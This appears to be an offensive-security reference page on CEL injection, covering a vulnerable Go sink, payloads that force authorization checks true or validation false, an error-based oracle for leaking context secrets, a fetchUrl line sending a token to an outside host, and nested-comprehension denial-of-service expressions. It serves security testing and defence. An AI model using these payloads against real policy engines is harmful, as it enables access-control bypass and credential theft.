---
title: "Common Expression Language injection and policy bypass"
description: "CEL is a sandboxed, non-Turing-complete evaluator; injection into admission, authorization, and validation expressions bends policy decisions, discloses context, and abuses host-registered functions."
keywords:
  - CEL injection
  - Common Expression Language
  - policy bypass
  - admission control
  - cel-go cel-python
  - context disclosure
---

# Common Expression Language

Common Expression Language (CEL) is an evaluation language embedded in hosts such as Kubernetes admission and validation rules, Envoy, and IAM condition expressions, with cel-go and cel-python as the common runtimes. It is sandboxed by design: non-Turing-complete, with no loops, no imports, no file or network input, and no mechanism to reach arbitrary code. There is no inherent command execution to find here. Expecting an `os.system` equivalent is the wrong model, and chasing one wastes the engagement.

What CEL injection actually buys is control over a decision. A CEL expression returns a value, usually a boolean that an admission controller, an authorizer, or a validator consumes. When attacker input reaches the expression string or the variables bound into its evaluation context, the target is that returned value: make an authorization check evaluate true, make a validation rule evaluate true for input it was meant to reject, or read back context the expression can see. Side effects exist only where the host registered a custom function with side effects, which is the single path to anything beyond a decision.

## The sink

CEL is dangerous in the same place any evaluated language is: where the expression text is assembled from input rather than fixed by the operator.

```go
// expression string built from user-controlled data
env, _ := cel.NewEnv(cel.Variable("user", cel.MapType(cel.StringType, cel.DynType)))
ast, _ := env.Compile("user.role == '" + role + "' && user.tenant == 'acme'")
prg, _ := env.Program(ast)
out, _, _ := prg.Eval(map[string]any{"user": claims})
```

Here `role` lands inside a CEL string literal exactly as a SQL or JavaScript string breakout, and CEL's own operators are available once the quote is closed.

## Forcing the decision

The highest-value outcome is making a policy evaluate to the attacker's advantage. Close the literal and short-circuit the boolean so the whole expression is true regardless of the real values. CEL static-type-checks every operand, so the injection has to leave the trailing template text well-typed: end it so the template's own closing quote completes a boolean comparison, not a bare string:

```
' || true || 'x'=='x
' || 1==1 || 'x'=='x
```

The first turns the predicate into `user.role == '' || true || 'x'=='x' && user.tenant == 'acme'`. Every operand is boolean, so it type-checks, and because `||` short-circuits on `true`, the authorization returns true for any caller. The inverse is just as useful against a rule meant to reject something: force the validation expression false so the guard never fires, again keeping the tail well-typed:

```
' && false || 'x'!='x
```

Where the expression is a function or macro rather than a flat comparison, CEL's own constructs rewrite the logic. Macros like `has()`, `size()`, and the list/map comprehensions (`all`, `exists`, `exists_one`, `map`, `filter`) are the levers:

```
user.roles.exists(r, true)
user.groups.all(g, true)
```

An `exists` that is forced true, or an `all` over an empty set (which returns true vacuously), flips a membership check that the policy author assumed would constrain access.

## Context disclosure

The expression can read every variable bound into its evaluation context, which is frequently richer than the one field the policy uses. Where any part of the evaluation result, an error message, or a downstream branch reflects a value back, the injected expression becomes a read primitive over the context:

```
user.token
object.spec.template.spec.containers[0].env
request.headers['authorization']
```

CEL evaluation errors are a common oracle: indexing a missing key, dividing by zero, or coercing types raises a runtime error whose presence or message leaks structure. Pair a boolean test about a context value with an error to build an oracle, the same way a blind injection confirms one bit at a time:

```
user.secret.startsWith('a') ? '' : user.missing_field_forces_error
```

If `secret` begins with `a` the expression returns empty and evaluation succeeds; otherwise the reference to a missing field errors. Whether the request errors answers the guess, recovering the value character by character without any value ever being printed.

## Abusing host-registered functions

The only route to a side effect is a function the host bound into the CEL environment. Runtimes ship extension libraries and applications register their own, and a function that reaches out beyond pure computation is the exception worth hunting for. Where the host registered network, DNS, lookup, or formatting helpers, an injected expression calls them:

```
getUser(attackerControlledId)
fetchUrl('http://10.0.0.5/' + user.token)
```

Nothing in base CEL provides these, so the technique is to first enumerate what the environment declares (the host's `cel.Function`/`cel.Declarations` registrations, or the admission policy's documented function set) and then exercise any that touch I/O, data lookups, or privileged state. Even pure helpers matter: a string-formatting or regex function exposed to attacker input can drive resource exhaustion.

## Resource and complexity abuse

CEL caps cost in principle, but where the host did not set a cost limit or set it generously, a crafted expression inflates evaluation work. Nested comprehensions over lists, which multiply the per-element work, and deeply nested macros raise CPU and memory during evaluation (CEL has no string-repetition operator, so cost comes from iteration, not from inflating a single value):

```
[0,1,2,3,4,5,6,7,8,9].map(a, [0,1,2,3,4,5,6,7,8,9].map(b, [0,1,2,3,4,5,6,7,8,9].map(c, c)))
```

An unbounded or weakly bounded evaluation is a denial-of-service lever against the admission or authorization path that runs the expression, which is often in the request hot path for every API call.

## Tools

- Manual testing with Burp Repeater; payloads crafted per engine.
- **Burp Intruder**: iterate boolean-oracle probes to recover context values character by character.

## References

- [CEL specification](https://github.com/google/cel-spec)
- [cel-go](https://github.com/google/cel-go)
- [Kubernetes: CEL validation rules](https://kubernetes.io/docs/reference/using-api/cel/)
- [CEL language definition](https://github.com/google/cel-spec/blob/master/doc/langdef.md)
